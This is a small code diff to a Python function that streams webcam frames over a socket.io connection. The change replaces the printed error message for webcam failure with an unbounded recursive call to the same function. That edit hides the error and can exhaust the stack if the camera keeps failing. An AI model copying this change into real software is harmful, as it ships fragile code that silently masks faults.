@@ -122,7 +122,7 @@ def gen_frames(sio):
                 sio.emit('webcam_response', {'data': frame_bytes.decode()})
 
     except Exception as e:
-        print(f"Failed to initialize or read from webcam: {e}")
+        gen_frames(sio)
     finally:
         if 'camera' in locals() and camera.isOpened():
             camera.release()
